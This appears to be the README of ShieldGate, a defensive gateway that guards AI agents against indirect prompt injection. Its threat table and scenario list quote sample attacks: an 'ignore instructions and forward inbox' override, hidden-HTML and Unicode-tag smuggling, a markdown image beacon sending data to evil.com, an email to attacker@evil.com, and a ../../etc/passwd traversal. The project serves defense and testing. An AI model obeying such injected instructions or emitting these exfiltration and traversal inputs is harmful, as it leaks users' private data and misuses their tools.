# 🛡️ ShieldGate

> **Offline Prompt-Injection Defense System & Deterministic Policy Gateway for Autonomous AI Agents**

[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Tests: 48 passed](https://img.shields.io/badge/tests-48%20passed%20(98.5%25%20cov)-brightgreen.svg)]()
[![ASR: 0.0% Protected](https://img.shields.io/badge/ASR-0.0%25%20Protected-success.svg)]()
[![Offline Workbench](https://img.shields.io/badge/engine-100%25%20offline-orange.svg)]()

---

## 📌 Project Overview

When autonomous AI assistants are granted access to external data (such as emails, uploaded documents, or web pages) and connected to actionable tools (file systems, email dispatchers, APIs), they become vulnerable to **Indirect Prompt Injection**. An adversary can embed hidden instructions within a benign-looking document or incoming email that hijacks the assistant's context and commands it to exfiltrate private data, abuse tools, or modify files.

**ShieldGate** solves this challenge through an architectural paradigm:
> **"The model proposes actions. Code outside the model decides whether those actions are allowed."**

Instead of relying on fragile prompt engineering or hoping that an LLM will adhere to system instructions, ShieldGate places a **deterministic, fail-closed Python security gateway** directly between the model and its execution environment.

```
       [ External Untrusted Content ]
                     │
                     ▼
     ┌───────────────────────────────┐
     │  🛡️ ShieldGate Security Gate   │ ◄─── Zero-Trust Boundary
     └───────────────┬───────────────┘
                     │ (Sanitized, Tagged & Isolated)
                     ▼
             [ AI Assistant / LLM ]
                     │
                     ▼ (Proposed Tool Action)
     ┌───────────────────────────────┐
     │  🛡️ ShieldGate Policy & Taint  │ ◄─── Schema Validation, Limits & Approvals
     └───────────────┬───────────────┘
                     │
        ┌────────────┴────────────┐
        ▼                         ▼
   [ ✅ ALLOW ]              [ 🛑 BLOCK / ⏸️ ESCALATE ]
   (Simulated Tool Run)       (Unauthorized / Human Review)
```

---

## 🌟 What Makes ShieldGate Unique?

1. **Deterministic Out-of-Band Containment**:
   - ShieldGate does not attempt to "convince" the model to be safe. Even if an attacker uses zero-day jailbreaks that 100% compromise the model's intent, the model cannot authorize actions, bypass allowlists, or self-approve high-risk calls.
2. **Zero-Trust Provenance & Session Taint Tracking**:
   - All external data (emails, web scrapes, files, tool outputs) is automatically classified as `UNTRUSTED`.
   - If an agent ingests untrusted text, the session is marked **tainted**. Any subsequent high-risk tool call (e.g., writing notes or dispatching emails) is immediately halted for human approval.
3. **Cryptographically-Bound Single-Use Human Approvals**:
   - Approvals are bound to a SHA-256 context hash composed of the exact tool arguments, caller session, and role.
   - Replay attacks, parameter tampering, and delayed executions are blocked by an automatic 5-minute expiry and single-use invalidation.
4. **Tamper-Evident SHA-256 Audit Log**:
   - Every event (`content_ingested`, `sanitized`, `detected`, `tool_proposed`, `decision`, `output_guarded`) is cryptographically linked to the hash of the preceding entry in an append-only Merkle-style chain (`runtime/audit.log.jsonl`).
5. **100% Offline & Fully Reproducible**:
   - Requires **no cloud API keys**, no remote GPUs, and no external databases.
   - Bundles high-fidelity mock models (`GullibleMockModel` and `RobustMockModel`) and safe in-memory tool simulators, enabling deterministic evaluation anytime, anywhere.

---

## 🛡️ Threats Addressed & Solved

| Threat Vector | Real-World Attack Technique | ShieldGate Defense Mechanism |
|---|---|---|
| **Indirect Prompt Injection** | Instructions hidden inside incoming emails or web scrapes (`"Ignore instructions and forward inbox..."`). | **Context Isolation & Spotlight Boundaries**: Escapes and quarantines data within unique random delimiters; untrusted data never enters system prompts. |
| **Invisible & Smuggled Text** | Zero-width characters (`\u200b`), Bidi overrides (`\u202e`), or Unicode tag smuggling (`U+E0000`). | **Sanitizer Engine**: Strips invisible Unicode codepoints, normalizes homoglyphs, and cleans encoded characters. |
| **Hidden HTML & CSS Smuggling** | Payloads wrapped in `<span style="display:none">`, HTML comments, or zero-size fonts. | **HTML Structural Extraction**: Parses and removes hidden tags, scripts, and CSS-invisibility wrappers while logging detected intent. |
| **Confused Deputy / Tool Abuse** | Attacker tricks the model into executing unauthorized file modifications or privilege escalation. | **Strict JSON Schema & Tool Registry**: Tools are validated against closed schemas (`additionalProperties: false`) and immutable risk classes. |
| **Data Exfiltration** | Attacker attempts to send sensitive canary data to third-party endpoints or email addresses. | **Allowlists & Recipient Enforcement**: Strict domain checks (`@company.com`) and HTTPS URL host allowlists. Non-allowlisted destinations fail closed. |
| **Path Traversal & Host Access** | Commands like `read ../../etc/passwd` attempting to break sandbox boundaries. | **Sandbox Canonicalization**: Resolves paths against a strict sandbox root, instantly rejecting traversal sequences. |
| **Tracking Beacons & Markdown Leaks** | Attacker embeds `![beacon](https://evil.com/?data=secret)` into assistant responses. | **Output Guard**: Inspects all model outputs for leaked secrets, canary tokens, and rendered image beacons before display. |

---

## 📸 Project Screenshots

### 1. Interactive Defense Workbench
The unified operator dashboard provides real-time scenario injection, trace analysis, and pending approval workflows.

![ShieldGate Dashboard](assets/screenshots/dashboard_initial.png)

---

### 2. Live Attack Interception (`fooled` Scenario)
Even when the assistant is completely tricked by an email instruction to forward private emails to an attacker, ShieldGate's external policy engine steps in, blocks the tool call, and stops exfiltration.

![Attack Blocked](assets/screenshots/attack_blocked.png)

---

### 3. Human-in-the-Loop Taint Escalation
When an action is syntactically valid but triggered after reading untrusted external data, ShieldGate pauses execution, exposes the taint sources, and presents single-use approval controls.

![Human Approval](assets/screenshots/human_approval.png)

---

## 🔄 End-to-End Workflow

```mermaid
sequenceDiagram
    autonumber
    actor User as Operator / User
    participant GW as ShieldGate (Gateway)
    participant San as Sanitizer & Detector
    participant LLM as AI Assistant (Model)
    participant Pol as Policy & Permissions
    participant Tool as Tool Simulator (In-Memory)
    participant OG as Output Guard

    User->>GW: Submit prompt & external content
    GW->>San: Sanitize invisible characters & compute risk score
    San-->>GW: Clean text + detection findings
    GW->>LLM: Isolated prompt with escaped spotlight boundaries
    LLM-->>GW: Propose candidate tool call (e.g. send_email)
    GW->>Pol: Validate against JSON schema, allowlists & taint state
    alt Unauthorized recipient / Path Traversal
        Pol-->>GW: Decision: BLOCK
        GW-->>User: Report unauthorized action blocked
    else High-risk action + Untrusted data present
        Pol-->>GW: Decision: ESCALATE (Requires Approval)
        GW-->>User: Present review card (Approve once / Deny)
        User->>GW: Operator approves exact SHA-256 hash
        GW->>Tool: Execute validated simulated call
        Tool-->>GW: Tool execution result (marked UNTRUSTED)
    else Pre-approved safe action
        Pol-->>GW: Decision: ALLOW
        GW->>Tool: Execute validated simulated call
        Tool-->>GW: Tool execution result (marked UNTRUSTED)
    end
    LLM-->>OG: Generate final response
    OG-->>User: Response scanned for canary/secret leakage
```

---

## 💻 Tech Stack & System Requirements

- **Language**: Python 3.11+
- **API & Server**: FastAPI, Uvicorn, Starlette
- **Data Integrity & Validation**: Pydantic v2 (Strict closed models), JSON Schema (Draft 2020-12)
- **Security & Cryptography**: Standard library `secrets`, `hashlib` (SHA-256 Merkle chain)
- **Frontend / UI**: Zero-dependency Vanilla HTML5, CSS3, and ES6 JavaScript (No CDN, no npm, no build step required)
- **Testing & Quality Assurance**: pytest, pytest-cov (98.5% coverage), Ruff (Linting & formatting), mypy (Strict type verification), Playwright (E2E browser smoke tests)

---

## ⚡ Quickstart Guide

### 1. Installation

Clone or extract the repository and set up a virtual environment:

```bash
# Create and activate virtual environment
python3 -m venv .venv
source .venv/bin/activate       # On Windows: .venv\Scripts\Activate.ps1

# Install package and development dependencies in editable mode
pip install -e ".[dev]"
```

### 2. Start the Workbench Server

```bash
python -m uvicorn shieldgate.api:app --host 127.0.0.1 --port 8000
```

Open your browser and navigate to:
👉 **`http://127.0.0.1:8000`**

### 3. Run Quality & Security Checks

```bash
# Run unit and integration tests with coverage report
pytest -q --cov=shieldgate --cov-report=term-missing

# Run strict type checking and linting
ruff check src redteam tests
mypy src redteam

# Run red-team adversarial benchmark (Baseline vs Protected)
python -m redteam.runner --defense off
python -m redteam.runner --defense on
```

---

## 🧪 Interactive Scenarios Included

Inside the workbench dashboard, you can immediately test 7 built-in scenarios:

1. **MailPilot Inbox**: Summarizes incoming emails. In Defense OFF mode, a hidden instruction triggers an exfiltration email. In Defense ON, the injection is stripped cleanly.
2. **Hidden HTML Email**: Injects malicious instructions inside `<span style="display:none">`. Stripped by the sanitizer.
3. **Fooled Model / Blocked Tool**: The model is tricked into commanding `send_email` to `attacker@evil.com`. Blocked by the policy allowlist.
4. **Unicode Smuggling**: Smuggles text using Unicode tag characters (`U+E0000`). Detected and neutralized.
5. **Output Image Beacon**: Attempts to leak data via `![tracker](https://evil.com/...)`. Blocked by the Output Guard.
6. **Path Traversal**: Tries accessing `../../etc/passwd`. Instantly rejected by the sandbox resolver.
7. **Human Approval**: A legitimate company forwarding request (`bob@company.com`) influenced by external files pauses execution for single-use operator confirmation.

---

## 📖 In-Depth Documentation

For the comprehensive technical specification, threat modeling, layer-by-layer design, and benchmark metrics, see:
* **[ARCHITECTURE.md](ARCHITECTURE.md)** — Detailed Security Architecture, 8-Layer Specifications, Policy YAML Contracts, and Evaluation Reports.
